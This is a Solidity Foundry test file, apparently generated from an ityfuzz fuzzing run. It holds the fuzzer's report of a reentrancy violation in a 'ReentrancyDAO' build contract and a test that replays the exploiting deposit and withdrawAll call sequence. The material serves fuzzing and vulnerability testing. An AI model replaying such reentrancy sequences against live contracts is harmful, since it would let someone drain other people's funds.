// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -t './build/*' -f
/*

😊😊 Found violations!


================ Description ================
[Reentrancy]: Reentrancy on "build/ReentrancyDAO(0x887db5715868498cff494b5dcc8eda6ce5b7652a)" at slot 47364442743061227748984307921801105892008374127114033722888417880247157497091
================ Trace ================
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.deposit{value: 0.1801 ether}()
   ├─[1] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.withdrawAll()
   │  ├─[2] [Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd.fallback()
   │  │  ├─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.deposit{value: 1844.6744 ether}()
   │  │  └─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.call(0x00000000)


 */

contract Build is Test {
    function setUp() public {
    }

    function test() public {
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).deposit{value: 0.1801 ether}();
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).withdrawAll();
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).deposit{value: 1844.6744 ether}();
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function withdrawAll() external payable;
    function deposit() external payable;
}
